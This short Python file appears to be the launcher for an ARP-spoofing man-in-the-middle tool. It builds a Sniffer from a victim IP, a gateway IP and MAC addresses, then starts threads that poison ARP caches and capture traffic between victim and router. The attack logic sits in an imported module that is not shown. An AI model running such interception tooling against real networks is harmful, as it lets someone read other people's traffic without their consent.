from sniffer2 import Sniffer
import threading

class FinalRun:
    def __init__(self, destinationMac, targetIP, gatewayIP, sourceMAC):
        self.sniffer = Sniffer(destinationMac, targetIP, gatewayIP, sourceMAC)

    def start(self):
        t_router = threading.Thread(target=self.sniffer.receive_victim)
        t_victim = threading.Thread(target=self.sniffer.receive_router)
        t_spoof = threading.Thread(target=self.sniffer.start_spoofing)
        t_spoof.start()
        print("started spoofing")
        t_router.start()
        t_victim.start()
        print("started sniffing")



